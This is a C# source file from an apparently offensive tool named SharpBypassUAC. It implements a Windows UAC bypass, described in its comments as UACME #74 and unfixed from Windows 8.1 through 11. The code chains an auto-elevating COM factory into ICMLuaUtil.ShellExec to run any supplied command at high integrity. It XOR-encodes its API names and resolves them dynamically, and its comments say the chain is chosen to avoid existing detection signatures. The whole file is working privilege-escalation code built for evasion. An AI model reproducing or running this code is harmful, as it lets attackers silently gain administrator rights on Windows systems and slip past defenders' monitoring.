using System;
using System.Text;
using System.Runtime.InteropServices;

namespace SharpBypassUAC
{
    // IElevatedFactoryServer COM interface (IID: 804BD226-AF47-4D71-B492-443A57610B08)
    // vtable layout after IUnknown (handled by runtime):
    //   [3] ServerCreateElevatedObject  <-- creates elevated COM objects
    [ComImport, Guid("804BD226-AF47-4D71-B492-443A57610B08")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IElevatedFactoryServer
    {
        void ServerCreateElevatedObject(
            [In] ref Guid rclsid,
            [In] ref Guid riid,
            [MarshalAs(UnmanagedType.IUnknown)] out object ppvObject);
    }

    /// <summary>
    /// UACME #74: IElevatedFactoryServer two-step COM elevation bypass.
    ///
    /// Step 1: Obtain IElevatedFactoryServer via elevation moniker
    ///         (CLSID: A6BFEA43-501F-456F-A845-983D3AD7B8F0, auto-elevate=true)
    /// Step 2: Call ServerCreateElevatedObject to create ICMLuaUtil
    ///         (CLSID: 3E5FC7F9-9A51-4367-9063-A120244FBEC7)
    /// Step 3: Use ICMLuaUtil.ShellExec to run command at high integrity
    ///
    /// Key difference from CmsTPLua: the first COM object (factory) is NOT
    /// ICMLuaUtil itself — it creates a second elevated object through its
    /// ServerCreateElevatedObject method. This two-step chain uses a different
    /// DLLHost.exe /Processid argument and thus a different detection signature.
    ///
    /// Unfixed: Windows 8.1 through Windows 11.
    /// </summary>
    public class ElevatedFactoryServer
    {
        // XOR key for ole32 API strings (reuse same key as CmsTPLua)
        private static readonly byte _xk = 0x3C;

        // "ole32.dll" ^ 0x3C
        private static readonly byte[] _s0 = new byte[] { 0x53, 0x50, 0x59, 0x0F, 0x0E, 0x12, 0x58, 0x50, 0x50 };
        // "CoGetObject" ^ 0x3C
        private static readonly byte[] _s1 = new byte[] { 0x7F, 0x53, 0x7B, 0x59, 0x48, 0x73, 0x5E, 0x56, 0x59, 0x5F, 0x48 };

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate int CoGetObjectDelegate(
            string pszName,
            ref BIND_OPTS3 pBindOptions,
            ref Guid riid,
            out IntPtr ppv);

        public ElevatedFactoryServer(byte[] encodedCommand)
        {
            AlwaysNotify alwaysnotify = new AlwaysNotify();

            string command = Encoding.UTF8.GetString(encodedCommand);

            Console.WriteLine("[*] ElevatedFactoryServer two-step COM bypass (UACME #74)");

            // Resolve CoGetObject from ole32.dll via D/Invoke
            var coGetObject = W.G<CoGetObjectDelegate>(W.X(_s0, _xk), W.X(_s1, _xk));

            // Step 1: Get IElevatedFactoryServer via elevation moniker
            // CLSID: {A6BFEA43-501F-456F-A845-983D3AD7B8F0} = VirtualFactoryServer
            string moniker = "Elevation:Administrator!new:{A6BFEA43-501F-456F-A845-983D3AD7B8F0}";

            // IID_IElevatedFactoryServer
            Guid iidFactory = new Guid("804BD226-AF47-4D71-B492-443A57610B08");

            BIND_OPTS3 bo = new BIND_OPTS3();
            bo.cbStruct = (uint)Marshal.SizeOf(typeof(BIND_OPTS3));
            bo.dwClassContext = 4; // CLSCTX_LOCAL_SERVER

            IntPtr ppvFactory;
            int hr = coGetObject(moniker, ref bo, ref iidFactory, out ppvFactory);

            if (hr != 0)
            {
                Console.WriteLine("[!] CoGetObject for ElevatedFactoryServer failed: 0x" + hr.ToString("X8"));
                return;
            }

            Console.WriteLine("[+] Obtained elevated IElevatedFactoryServer interface");

            IElevatedFactoryServer factory = (IElevatedFactoryServer)Marshal.GetObjectForIUnknown(ppvFactory);

            try
            {
                // Step 2: Use factory to create elevated ICMLuaUtil
                // CLSID_CMSTPLUA: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
                Guid clsidCmstp = new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7");
                // IID_ICMLuaUtil: {6EDD6D74-C007-4E75-B76A-E5740995E24C}
                Guid iidCmLua = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");

                object cmlObj;
                factory.ServerCreateElevatedObject(ref clsidCmstp, ref iidCmLua, out cmlObj);

                if (cmlObj == null)
                {
                    Console.WriteLine("[!] ServerCreateElevatedObject returned null");
                    return;
                }

                Console.WriteLine("[+] Created elevated ICMLuaUtil via factory");

                ICMLuaUtil cmlua = (ICMLuaUtil)cmlObj;

                // Parse command into file + arguments
                string file;
                string parameters = null;
                ParseCommand(command, out file, out parameters);

                try
                {
                    cmlua.ShellExec(file, parameters, "C:\\Windows\\System32", 0, 0);
                    Console.WriteLine("[+] Elevated command executed via factory chain");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] ShellExec failed: " + ex.Message);
                }
                finally
                {
                    Marshal.ReleaseComObject(cmlua);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] ServerCreateElevatedObject failed: " + ex.Message);
            }
            finally
            {
                Marshal.ReleaseComObject(factory);
                Marshal.Release(ppvFactory);
            }
        }

        private static void ParseCommand(string command, out string file, out string parameters)
        {
            parameters = null;
            if (command.StartsWith("\""))
            {
                int endQuote = command.IndexOf('"', 1);
                if (endQuote > 0)
                {
                    file = command.Substring(1, endQuote - 1);
                    if (endQuote + 2 < command.Length)
                        parameters = command.Substring(endQuote + 2);
                }
                else
                {
                    file = command.TrimStart('"');
                }
            }
            else
            {
                int spaceIdx = command.IndexOf(' ');
                if (spaceIdx > 0)
                {
                    file = command.Substring(0, spaceIdx);
                    parameters = command.Substring(spaceIdx + 1);
                }
                else
                {
                    file = command;
                }
            }
        }
    }
}
